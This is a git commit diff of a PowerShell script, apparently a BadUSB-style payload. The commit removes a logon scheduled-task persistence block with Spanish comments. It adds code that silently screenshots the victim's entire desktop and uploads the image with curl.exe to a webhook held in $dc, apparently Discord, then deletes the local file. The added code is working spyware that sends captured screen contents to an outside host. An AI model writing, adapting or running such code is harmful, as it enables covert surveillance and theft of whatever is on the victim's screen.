06463f62591370f7168051833773b0f9632a2b91
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 10:29:47 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,46 +1,27 @@
 $hookurl = "$dc"
-$seconds = 30 # Intervalo entre acciones
-$a = 1 # Cantidad de acciones
+$seconds = 30 # Screenshot interval
+$a = 1 # Sceenshot amount
 
-# Detección de URL acortada
-if ($hookurl.Length -ne 121) {
-    Write-Host "URL de webhook acortada detectada..." 
-    $hookurl = (irm $hookurl).url
-}
+# shortened URL Detection
+if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
-# Obtener la ruta de la carpeta temporal del usuario actual
-$ScriptFolder = Join-Path -Path $env:TEMP -ChildPath "syswFolder"
-if (-not (Test-Path -Path $ScriptFolder)) {
-    New-Item -ItemType Directory -Path $ScriptFolder | Out-Null
-}
-
-# Obtener la ruta completa del script
-$ScriptPath = Join-Path -Path $ScriptFolder -ChildPath "sysw.ps1"
-
-# Crear el script en la ruta especificada si no existe
-if (-not (Test-Path -Path $ScriptPath)) {
-@"
-# Inserta aquí las acciones que deseas realizar
-Write-Host "Acción realizada"
-"@ | Set-Content -Path $ScriptPath
-}
-
-# Función para crear la tarea programada
-function CrearTareaProgramada {
-    $TaskName = "TareaAlInicio"
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $ScriptPath
-    $Trigger = New-ScheduledTaskTrigger -AtLogon
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -User $env:USERNAME -RunLevel Limited -Force
-}
-
-# Crear tarea programada si no existe
-if (-not (Get-ScheduledTask -TaskName "TareaAlInicio" -ErrorAction SilentlyContinue)) {
-    CrearTareaProgramada
-}
-
-# Bucle principal para realizar acciones
-While ($a -gt 0) {
-    # Insertar aquí las acciones a realizar
-    Start-Sleep $seconds
-    $a--
+While ($a -gt 0){
+$Filett = "$env:temp\SC.png"
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+Start-Sleep 1
+curl.exe -F "file1=@$filett" $hookurl
+Start-Sleep 1
+Remove-Item -Path $filett
+Start-Sleep $seconds
+$a--
 }
